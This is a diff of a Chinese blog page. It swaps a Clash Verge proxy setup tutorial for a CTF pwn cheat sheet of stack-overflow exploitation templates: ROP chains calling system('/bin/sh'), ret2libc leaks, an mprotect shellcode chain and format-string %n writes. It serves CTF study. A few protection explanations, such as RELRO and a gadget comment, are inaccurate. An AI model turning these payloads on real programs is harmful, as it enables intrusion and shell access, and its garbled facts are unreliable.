@@ -5,11 +5,11 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>2023年windows,Mac科学上网 | Rural Blog</title>
-<meta name="keywords" content="vpn, clash">
-<meta name="description" content="PC端科学上网教程">
+<title>CTF Pwn二进制总结 | Rural Blog</title>
+<meta name="keywords" content="CTF, PWN">
+<meta name="description" content="pwn栈部分内容">
 <meta name="author" content="Rural Bee">
-<link rel="canonical" href="https://ruralbee.github.io/posts/vpn/magic_internet/">
+<link rel="canonical" href="https://ruralbee.github.io/posts/ctf/pwn_stack/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.435fd7d00645589c1a1147f7b5b62b3a2bb66105a0e78ee419ba5010b59305d0.css" integrity="sha256-Q1/X0AZFWJwaEUf3tbYrOiu2YQWg547kGbpQELWTBdA=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://ruralbee.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://ruralbee.github.io/favicon-16x16.png">
@@ -18,7 +18,7 @@
 <link rel="mask-icon" href="https://ruralbee.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="zh" href="https://ruralbee.github.io/posts/vpn/magic_internet/">
+<link rel="alternate" hreflang="zh" href="https://ruralbee.github.io/posts/ctf/pwn_stack/">
 <noscript>
     <style>
         #theme-toggle,
@@ -55,18 +55,18 @@
         }
 
     </style>
-</noscript><meta property="og:title" content="2023年windows,Mac科学上网" />
-<meta property="og:description" content="PC端科学上网教程" />
+</noscript><meta property="og:title" content="CTF Pwn二进制总结" />
+<meta property="og:description" content="pwn栈部分内容" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ruralbee.github.io/posts/vpn/magic_internet/" /><meta property="og:image" content="https://ruralbee.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-12-07T00:00:00+00:00" />
-<meta property="article:modified_time" content="2023-12-07T00:00:00+00:00" />
+<meta property="og:url" content="https://ruralbee.github.io/posts/ctf/pwn_stack/" /><meta property="og:image" content="https://ruralbee.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-12-16T00:00:00+00:00" />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://ruralbee.github.io/papermod-cover.png"/>
 
-<meta name="twitter:title" content="2023年windows,Mac科学上网"/>
-<meta name="twitter:description" content="PC端科学上网教程"/>
+<meta name="twitter:title" content="CTF Pwn二进制总结"/>
+<meta name="twitter:description" content="pwn栈部分内容"/>
 
 
 <script type="application/ld+json">
@@ -83,14 +83,8 @@
     {
       "@type": "ListItem",
       "position":  2 ,
-      "name": "vpn",
-      "item": "https://ruralbee.github.io/posts/vpn/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "2023年windows,Mac科学上网",
-      "item": "https://ruralbee.github.io/posts/vpn/magic_internet/"
+      "name": "CTF Pwn二进制总结",
+      "item": "https://ruralbee.github.io/posts/ctf/pwn_stack/"
     }
   ]
 }
@@ -99,24 +93,24 @@
 {
   "@context": "https://schema.org",
   "@type": "BlogPosting",
-  "headline": "2023年windows,Mac科学上网",
-  "name": "2023年windows,Mac科学上网",
-  "description": "PC端科学上网教程",
+  "headline": "CTF Pwn二进制总结",
+  "name": "CTF Pwn二进制总结",
+  "description": "pwn栈部分内容",
   "keywords": [
-    "vpn", "clash"
+    "CTF", "PWN"
   ],
-  "articleBody": "软件下载: Clash Verge 简介： Clash Verge 是 Clash 的一个图形用户界面（GUI）客户端，支持 Windows、macOS、Linux 等操作系统。它能够帮助用户实现科学上网，同时具备强大的规则配置和灵活的代理策略，使用户可以更轻松地管理代理规则和节点。 下载链接： 下载地址 下载安装步骤： 下载github加速工具\n打开浏览器，输入网址https://steampp.net/，下载Watt Toolkit工具并安装 启动加速工具\n分别按照下面图片的步骤依次点击：网络加速-\u003e勾选GitHub-\u003e一键加速，出现第二张图片的加速已成功启动，表示已经成功\n点击上方下载链接浏览器会自动跳到github下载页面，如果没有成功跳转在浏览器中输入以下链接https://github.com/zzzgydi/clash-verge/releases/,下图所示为成功打开下载页面。 滑动网页选择windows或Mac相应的软件 购买机场 机场使用与步骤： 机场推荐：点击这里 选择机场\n这里使用八戒机场为案例，机场网址为：网址，输入邮箱和密码后，通过人机验证后即可购买。 点击购买订阅-\u003e选择套餐-\u003e点击下单-\u003e结账-\u003e选择支付方式，之后付款即可。 返回仪表盘-\u003e一键订阅-\u003e复制订阅地址 Clash Verge使用 使用步骤： clashe verge安装 安装clashe verge，并修改软件语言为中文：Settings-\u003eLanguage-\u003e中文 返回配置-\u003e输入刚才复制的订阅地址，然后点击导入，导入成功为第二张图 返回设置-\u003e开启系统代理，之后就能够魔法上网。 clash verge高级使用方法参考：clash verge ",
-  "wordCount" : "40",
+  "articleBody": "栈溢出 防护方式 RELRO（ReLocation Read-Only） Partial RELRO: 部分开启堆栈地址随机化，got表可写 Full RELRO: 全部开启，got表不可写. Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表/内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。 Canary：栈溢出保护机制。这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出。 NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用。 PIE（Position Independent Executable）：地址无关可执行文件，是针对.text（代码段）、.data（数据段）、.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。 x64 Rop构造方式 payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr)，其中payload = 填充字节（buf+rbp） + retn汇编指令地址（可不加上） + pop rdi地址 + 构造的函数参数地址 + 构造的函数地址，有多个参数还需要添加其他的rop,x64的寄存器前六个是 rdi, rsi, rdx, rcx, r8, r9，其余直接放入栈中。\nret2libc 使用put函数获取libc地址的payload常见方式\npayload = cyclic(len(buf+rbp)) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) main_addr是下次跳转的函数地址\r使用write函数获取libc地址payload常见方式\npayload=cyclic(len(buf+rbp))+p64(rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(8)+p64(write_plt)+p64(main_addr) main_addr是下次跳转的函数地址\r构造shell的payload payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr) ret2shellcode pwntool生成shellcode代码shellcode=asm(shellcraft.sh()),但是要记得添加context(os='linux', arch='amd64') x86 Rop构造方式 单个函数payload=cyclic(len(buf+rbp))+p32(func_addr)+p32(0xdeadbeef)+p32(param)其中payload = 填充字节（buf+rbp）+ 函数地址 + 函数返回的地址 + 构造的函数参数（system输入的是字符串地址）。 两个函数payload=cyclic(len(buf+rbp))+p32(func1_addr)+p32(func2_addr)+p32(func1_param) + p32(func2_param)其中payload = 填充字节（buf+rbp）+ 函数1地址 + 函数2地址 + 函数1参数+ 函数2参数 ret2shellcode 使用mprotect构造可执行内存块 payload = cyclic(len(buf+rbp))\rpayload += p32(mprotect_addr)\rpayload += p32(pop3_edx_esi_ebx_ret)\rpayload += p32(mem_addr) + p32(mem_size) + p32(mem_type) + p32(其他恶意地址) pop3_edx_esi_ebx_ret为# pop esi ; pop ebx ; pop edx ; ret ret2libc 使用write函数泄露libc地址 使用plt表获取libc地址： payload=cyclic(len(buf+rbp))+p32(write_plt)+p32(return_addr)+p32(1)+p32(write_got)+p32(4) 调用system函数:\npayload=cyclic(len(buf+rbp))+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh) libc泄露代码 LibcSearcher方法 libc=LibcSearcher('write',write_addr)\rlibc_base=write_addr-libc.dump('write')\rsystem=libc_base+libc.dump('system')\rsh=libc_base+libc.dump('str_bin_sh') LibcSearcherX方法 libc = LibcSearcherLocal/LibcSearcher(\"write\",write_addr)\rlibcbase = write_addr - libc.sym['write']\rsystem = libcbase + libc.sym['system']\rbin_sh = libcbase + libc.sym['str_bin_sh'] 格式化字符串 格式化符号说明 %x 以十六进制打印，只能打印4字节，一般只用于32位 %p 打印目标地址，建议32位和64位都用这个 %s 打印地址内容 %c 打印单个字符 %hhn 写一字节 %hn 写两字节 %n 写四字节 %ln 32位写四字节，64位写八字节 %lln 写八字节 获取偏移（两种方式） 手动方式：输入aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p.....，依据结果获取偏移 动态调试：gdb启动程序打好断点后，查看输入数据写入的地址，输入fmtarg 0xaddress 即可获取偏移（offset）。 写入数据payload = p32(target_addr)+\"%{}c%{}$n\".format(value-4, offset) target_addr是要写入的地址，value 是写入的大小，offset是1步骤中获得的结果。 常见命令 find find / -name flag ROPgadget ROPgadget --binary babyrop | grep \"pop rdi\" ROPgadget字符串搜索 ROPgadget --binary ciscn_2019_ne_5 --string sh 函数绕过 strlen使用\\00截断绕过 IDA Pro使用技巧 ctrl+s 查看.got.plt/.bss起始地址 常用函数 ssize_t write(int fd,const void*buf,size_t count);\r函数的fd为文件描述符write函数为1，count为写入字节，x86为4、x64为8 汇编 leave == mov ebp esp; pop ebp ret == pop eip ",
+  "wordCount" : "218",
   "inLanguage": "zh",
-  "datePublished": "2023-12-07T00:00:00Z",
-  "dateModified": "2023-12-07T00:00:00Z",
+  "datePublished": "2023-12-16T00:00:00Z",
+  "dateModified": "2023-12-16T00:00:00Z",
   "author":{
     "@type": "Person",
     "name": "Rural Bee"
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https://ruralbee.github.io/posts/vpn/magic_internet/"
+    "@id": "https://ruralbee.github.io/posts/ctf/pwn_stack/"
   },
   "publisher": {
     "@type": "Organization",
@@ -209,14 +203,14 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="https://ruralbee.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://ruralbee.github.io/posts/">Posts</a>&nbsp;»&nbsp;<a href="https://ruralbee.github.io/posts/vpn/">vpn</a></div>
+    <div class="breadcrumbs"><a href="https://ruralbee.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://ruralbee.github.io/posts/">Posts</a></div>
     <h1 class="post-title">
-      2023年windows,Mac科学上网
+      CTF Pwn二进制总结
     </h1>
     <div class="post-description">
-      PC端科学上网教程
+      pwn栈部分内容
     </div>
-    <div class="post-meta"><span title='2023-12-07 00:00:00 +0000 UTC'>十二月 7, 2023</span>&nbsp;·&nbsp;1 分钟&nbsp;·&nbsp;Rural Bee&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/vpn/magic_internet/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+    <div class="post-meta"><span title='2023-12-16 00:00:00 +0000 UTC'>十二月 16, 2023</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Rural Bee&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/ctf/pwn_stack.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -228,12 +222,45 @@
 
             <div class="inner"><ul>
                     <li>
-                        <a href="#%e8%bd%af%e4%bb%b6%e4%b8%8b%e8%bd%bd-clash-verge" aria-label="软件下载: Clash Verge">软件下载: Clash Verge</a></li>
+                        <a href="#%e6%a0%88%e6%ba%a2%e5%87%ba" aria-label="栈溢出">栈溢出</a><ul>
+                            
                     <li>
-                        <a href="#%e8%b4%ad%e4%b9%b0%e6%9c%ba%e5%9c%ba" aria-label="购买机场">购买机场</a></li>
+                        <a href="#%e9%98%b2%e6%8a%a4%e6%96%b9%e5%bc%8f" aria-label="防护方式">防护方式</a></li>
                     <li>
-                        <a href="#clash-verge%e4%bd%bf%e7%94%a8" aria-label="Clash Verge使用">Clash Verge使用</a>
+                        <a href="#x64-rop%e6%9e%84%e9%80%a0%e6%96%b9%e5%bc%8f" aria-label="x64 Rop构造方式">x64 Rop构造方式</a><ul>
+                            
+                    <li>
+                        <a href="#ret2libc" aria-label="ret2libc">ret2libc</a></li>
+                    <li>
+                        <a href="#ret2shellcode" aria-label="ret2shellcode">ret2shellcode</a></li></ul>
                     </li>
+                    <li>
+                        <a href="#x86-rop%e6%9e%84%e9%80%a0%e6%96%b9%e5%bc%8f" aria-label="x86 Rop构造方式">x86 Rop构造方式</a><ul>
+                            
+                    <li>
+                        <a href="#ret2shellcode-1" aria-label="ret2shellcode">ret2shellcode</a></li>
+                    <li>
+                        <a href="#ret2libc-1" aria-label="ret2libc">ret2libc</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2" aria-label="格式化字符串">格式化字符串</a><ul>
+                            
+                    <li>
+                        <a href="#%e6%a0%bc%e5%bc%8f%e5%8c%96%e7%ac%a6%e5%8f%b7%e8%af%b4%e6%98%8e" aria-label="格式化符号说明">格式化符号说明</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%b8%b8%e8%a7%81%e5%91%bd%e4%bb%a4" aria-label="常见命令">常见命令</a></li>
+                    <li>
+                        <a href="#%e5%87%bd%e6%95%b0%e7%bb%95%e8%bf%87" aria-label="函数绕过">函数绕过</a></li>
+                    <li>
+                        <a href="#ida-pro%e4%bd%bf%e7%94%a8%e6%8a%80%e5%b7%a7" aria-label="IDA Pro使用技巧">IDA Pro使用技巧</a></li>
+                    <li>
+                        <a href="#%e5%b8%b8%e7%94%a8%e5%87%bd%e6%95%b0" aria-label="常用函数">常用函数</a></li>
+                    <li>
+                        <a href="#%e6%b1%87%e7%bc%96" aria-label="汇编">汇编</a>
+                    </li>
+                </ul>
+                </li>
                 </ul>
             </div>
         </details>
@@ -299,68 +326,120 @@
     }
 </script>
 
-  <div class="post-content"><h2 id="软件下载-clash-verge">软件下载: Clash Verge<a hidden class="anchor" aria-hidden="true" href="#软件下载-clash-verge">#</a></h2>
-<ul>
-<li><strong>简介：</strong> Clash Verge 是 Clash 的一个图形用户界面（GUI）客户端，支持 Windows、macOS、Linux 等操作系统。它能够帮助用户实现科学上网，同时具备强大的规则配置和灵活的代理策略，使用户可以更轻松地管理代理规则和节点。</li>
-<li><strong>下载链接：</strong>  <a href="https://github.com/zzzgydi/clash-verge/releases/">下载地址</a></li>
-<li><strong>下载安装步骤：</strong>
+  <div class="post-content"><h1 id="栈溢出">栈溢出<a hidden class="anchor" aria-hidden="true" href="#栈溢出">#</a></h1>
+<h2 id="防护方式">防护方式<a hidden class="anchor" aria-hidden="true" href="#防护方式">#</a></h2>
 <ol>
-<li>下载github加速工具<br>
-打开浏览器，输入网址https://steampp.net/，下载Watt Toolkit工具并安装
-<img loading="lazy" src="images/20231207095503.png" alt=""  />
-</li>
-<li>启动加速工具<br>
-分别按照下面图片的步骤依次点击：网络加速-&gt;勾选GitHub-&gt;一键加速，出现第二张图片的加速已成功启动，表示已经成功<br>
-<img loading="lazy" src="images/20231207095958.png" alt=""  />
-
-<img loading="lazy" src="images/20231207100239.png" alt=""  />
-</li>
-<li>点击上方下载链接浏览器会自动跳到github下载页面，如果没有成功跳转在浏览器中输入以下链接https://github.com/zzzgydi/clash-verge/releases/,下图所示为成功打开下载页面。
-<img loading="lazy" src="images/20231206163834.png" alt=""  />
-</li>
-<li>滑动网页选择windows或Mac相应的软件
-<img loading="lazy" src="images/20231206172536.png" alt=""  />
-</li>
-</ol>
-</li>
+<li>RELRO（ReLocation Read-Only）
+<ul>
+<li>Partial RELRO: 部分开启堆栈地址随机化，got表可写</li>
+<li>Full RELRO: 全部开启，got表不可写.</li>
+<li>Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表/内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。</li>
 </ul>
-<h2 id="购买机场">购买机场<a hidden class="anchor" aria-hidden="true" href="#购买机场">#</a></h2>
-<ul>
-<li><strong>机场使用与步骤：</strong> 机场推荐：<a href="../airplane">点击这里</a>
-<ol>
-<li>选择机场<br>
-这里使用八戒机场为案例，机场网址为：<a href="https://bajie.pw/#/register?code=HporUTpj">网址</a>，输入邮箱和密码后，通过人机验证后即可购买。
-<img loading="lazy" src="images/20231207104126.png" alt=""  />
 </li>
-<li>点击购买订阅-&gt;选择套餐-&gt;点击下单-&gt;结账-&gt;选择支付方式，之后付款即可。
-<img loading="lazy" src="images/20231207105102.png" alt=""  />
-</li>
-<li>返回仪表盘-&gt;一键订阅-&gt;复制订阅地址
-<img loading="lazy" src="images/20231207105851.png" alt=""  />
-</li>
+<li>Canary：栈溢出保护机制。这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出。</li>
+<li>NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用。</li>
+<li>PIE（Position Independent Executable）：地址无关可执行文件，是针对.text（代码段）、.data（数据段）、.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。</li>
 </ol>
-</li>
+<h2 id="x64-rop构造方式">x64 Rop构造方式<a hidden class="anchor" aria-hidden="true" href="#x64-rop构造方式">#</a></h2>
+<p><code>payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr)</code>，其中payload = 填充字节（buf+rbp） + retn汇编指令地址（可不加上） + pop rdi地址 + 构造的函数参数地址 + 构造的函数地址，有多个参数还需要添加其他的rop,x64的寄存器前六个是 rdi, rsi, rdx, rcx, r8, r9，其余直接放入栈中。</p>
+<h3 id="ret2libc">ret2libc<a hidden class="anchor" aria-hidden="true" href="#ret2libc">#</a></h3>
+<ol>
+<li>使用put函数获取libc地址的payload常见方式<br>
+<code>payload = cyclic(len(buf+rbp)) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) main_addr是下次跳转的函数地址 </code></li>
+<li>使用write函数获取libc地址payload常见方式<br>
+<code>payload=cyclic(len(buf+rbp))+p64(rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(8)+p64(write_plt)+p64(main_addr) main_addr是下次跳转的函数地址 </code></li>
+<li>构造shell的payload   <code>payload=cyclic(len(buf+rbp))+p64(retn_addr)+p64(popdi_addr)+p64(binsh_addr)+p64(system_addr)</code></li>
+</ol>
+<h3 id="ret2shellcode">ret2shellcode<a hidden class="anchor" aria-hidden="true" href="#ret2shellcode">#</a></h3>
+<ol>
+<li>pwntool生成shellcode代码<code>shellcode=asm(shellcraft.sh())</code>,但是要记得添加<code>context(os='linux', arch='amd64')</code></li>
+</ol>
+<h2 id="x86-rop构造方式">x86 Rop构造方式<a hidden class="anchor" aria-hidden="true" href="#x86-rop构造方式">#</a></h2>
+<ul>
+<li>单个函数<code>payload=cyclic(len(buf+rbp))+p32(func_addr)+p32(0xdeadbeef)+p32(param)</code>其中payload = 填充字节（buf+rbp）+ 函数地址 + 函数返回的地址 + 构造的函数参数（system输入的是字符串地址）。</li>
+<li>两个函数<code>payload=cyclic(len(buf+rbp))+p32(func1_addr)+p32(func2_addr)+p32(func1_param) + p32(func2_param)</code>其中payload = 填充字节（buf+rbp）+ 函数1地址 + 函数2地址 + 函数1参数+ 函数2参数</li>
 </ul>
-<h2 id="clash-verge使用">Clash Verge使用<a hidden class="anchor" aria-hidden="true" href="#clash-verge使用">#</a></h2>
-<ul>
-<li><strong>使用步骤：</strong>
+<h3 id="ret2shellcode-1">ret2shellcode<a hidden class="anchor" aria-hidden="true" href="#ret2shellcode-1">#</a></h3>
 <ol>
-<li>clashe verge安装 <br>
-安装clashe verge，并修改软件语言为中文：Settings-&gt;Language-&gt;中文
-<img loading="lazy" src="images/20231207102746.png" alt=""  />
-</li>
-<li>返回配置-&gt;输入刚才复制的订阅地址，然后点击导入，导入成功为第二张图
-<img loading="lazy" src="images/20231207110539.png" alt=""  />
-
-<img loading="lazy" src="images/20231207110734.png" alt=""  />
-</li>
-<li>返回设置-&gt;开启系统代理，之后就能够魔法上网。
-<img loading="lazy" src="images/20231207111006.png" alt=""  />
-</li>
-<li>clash verge高级使用方法参考：<a href="../clashverge">clash verge</a></li>
+<li>使用mprotect构造可执行内存块
+<pre tabindex="0"><code>payload = cyclic(len(buf+rbp))
+payload += p32(mprotect_addr)
+payload += p32(pop3_edx_esi_ebx_ret)
+payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) + p32(其他恶意地址)
+</code></pre>pop3_edx_esi_ebx_ret为<code># pop esi ; pop ebx ; pop edx ; ret</code></li>
 </ol>
-  <!-- [clash verge](/posts/vpn/clashverge/) -->
+<h3 id="ret2libc-1">ret2libc<a hidden class="anchor" aria-hidden="true" href="#ret2libc-1">#</a></h3>
+<ol>
+<li>使用write函数泄露libc地址
+<ol>
+<li>使用plt表获取libc地址：
+<code>payload=cyclic(len(buf+rbp))+p32(write_plt)+p32(return_addr)+p32(1)+p32(write_got)+p32(4)</code></li>
+<li>调用system函数:<br>
+<code>payload=cyclic(len(buf+rbp))+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh)</code></li>
+</ol>
 </li>
+<li>libc泄露代码
+<ol>
+<li>LibcSearcher方法</li>
+</ol>
+<pre tabindex="0"><code>libc=LibcSearcher(&#39;write&#39;,write_addr)
+libc_base=write_addr-libc.dump(&#39;write&#39;)
+system=libc_base+libc.dump(&#39;system&#39;)
+sh=libc_base+libc.dump(&#39;str_bin_sh&#39;)
+</code></pre><ol start="2">
+<li>LibcSearcherX方法</li>
+</ol>
+<pre tabindex="0"><code>libc = LibcSearcherLocal/LibcSearcher(&#34;write&#34;,write_addr)
+libcbase = write_addr - libc.sym[&#39;write&#39;]
+system = libcbase + libc.sym[&#39;system&#39;]
+bin_sh = libcbase + libc.sym[&#39;str_bin_sh&#39;]
+</code></pre></li>
+</ol>
+<h2 id="格式化字符串">格式化字符串<a hidden class="anchor" aria-hidden="true" href="#格式化字符串">#</a></h2>
+<h3 id="格式化符号说明">格式化符号说明<a hidden class="anchor" aria-hidden="true" href="#格式化符号说明">#</a></h3>
+<ul>
+<li>%x 以十六进制打印，只能打印4字节，一般只用于32位</li>
+<li>%p 打印目标地址，建议32位和64位都用这个</li>
+<li>%s 打印地址内容</li>
+<li>%c 打印单个字符</li>
+<li>%hhn 写一字节</li>
+<li>%hn  写两字节</li>
+<li>%n   写四字节</li>
+<li>%ln  32位写四字节，64位写八字节</li>
+<li>%lln 写八字节</li>
+</ul>
+<ol>
+<li>获取偏移（两种方式）</li>
+</ol>
+<ul>
+<li>手动方式：输入<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p.....</code>，依据结果获取偏移</li>
+<li>动态调试：gdb启动程序打好断点后，查看输入数据写入的地址，输入<code>fmtarg 0xaddress</code> 即可获取偏移（offset）。</li>
+</ul>
+<ol start="2">
+<li>写入数据<code>payload = p32(target_addr)+&quot;%{}c%{}$n&quot;.format(value-4, offset)</code> target_addr是要写入的地址，value 是写入的大小，offset是1步骤中获得的结果。</li>
+</ol>
+<h2 id="常见命令">常见命令<a hidden class="anchor" aria-hidden="true" href="#常见命令">#</a></h2>
+<ul>
+<li>find <code>find / -name flag</code></li>
+<li>ROPgadget <code>ROPgadget --binary babyrop | grep &quot;pop rdi&quot; </code></li>
+<li>ROPgadget字符串搜索 <code>ROPgadget --binary ciscn_2019_ne_5 --string sh</code></li>
+</ul>
+<h2 id="函数绕过">函数绕过<a hidden class="anchor" aria-hidden="true" href="#函数绕过">#</a></h2>
+<ul>
+<li>strlen使用<code>\00</code>截断绕过</li>
+</ul>
+<h2 id="ida-pro使用技巧">IDA Pro使用技巧<a hidden class="anchor" aria-hidden="true" href="#ida-pro使用技巧">#</a></h2>
+<ul>
+<li>ctrl+s 查看.got.plt/.bss起始地址</li>
+</ul>
+<h2 id="常用函数">常用函数<a hidden class="anchor" aria-hidden="true" href="#常用函数">#</a></h2>
+<ul>
+<li><code>ssize_t write(int fd,const void*buf,size_t count); </code>函数的fd为文件描述符write函数为1，count为写入字节，x86为4、x64为8</li>
+</ul>
+<h2 id="汇编">汇编<a hidden class="anchor" aria-hidden="true" href="#汇编">#</a></h2>
+<ul>
+<li>leave == mov ebp esp; pop ebp</li>
+<li>ret == pop eip</li>
 </ul>
 
 
@@ -368,68 +447,68 @@
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="https://ruralbee.github.io/tags/vpn/">vpn</a></li>
-      <li><a href="https://ruralbee.github.io/tags/clash/">clash</a></li>
+      <li><a href="https://ruralbee.github.io/tags/ctf/">CTF</a></li>
+      <li><a href="https://ruralbee.github.io/tags/pwn/">PWN</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://ruralbee.github.io/posts/ctf/ctf_cloudsec/">
+  <a class="prev" href="https://ruralbee.github.io/posts/vpn/airplane/">
     <span class="title">« 上一页</span>
     <br>
-    <span>云安全总结</span>
+    <span>2023年12月科学上网VPN机场推荐</span>
   </a>
-  <a class="next" href="https://ruralbee.github.io/posts/vpn/clashverge/">
+  <a class="next" href="https://ruralbee.github.io/posts/other/hugo/">
     <span class="title">下一页 »</span>
     <br>
-    <span>Clash Verge使用教程</span>
+    <span>Hugo静态网站搭建</span>
   </a>
 </nav>
 
 
 <div class="share-buttons">
-    <a target="_blank" rel="noopener noreferrer" aria-label="share 2023年windows,Mac科学上网 on x"
-        href="https://x.com/intent/tweet/?text=2023%e5%b9%b4windows%2cMac%e7%a7%91%e5%ad%a6%e4%b8%8a%e7%bd%91&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f&amp;hashtags=vpn%2cclash">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share CTF Pwn二进制总结 on x"
+        href="https://x.com/intent/tweet/?text=CTF%20Pwn%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%80%bb%e7%bb%93&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f&amp;hashtags=CTF%2cPWN">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z"/>
         </svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share 2023年windows,Mac科学上网 on linkedin"
-        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f&amp;title=2023%e5%b9%b4windows%2cMac%e7%a7%91%e5%ad%a6%e4%b8%8a%e7%bd%91&amp;summary=2023%e5%b9%b4windows%2cMac%e7%a7%91%e5%ad%a6%e4%b8%8a%e7%bd%91&amp;source=https%3a%2f%2fruralbee.github.io%2fposts%2fvpn%2fmagic_internet%2f">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share CTF Pwn二进制总结 on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f&amp;title=CTF%20Pwn%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%80%bb%e7%bb%93&amp;summary=CTF%20Pwn%e4%ba%8c%e8%bf%9b%e5%88%b6%e6%80%bb%e7%bb%93&amp;source=https%3a%2f%2fruralbee.github.io%2fposts%2fctf%2fpwn_stack%2f">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
         </svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share 2023年windows,Mac科学上网 on reddit"
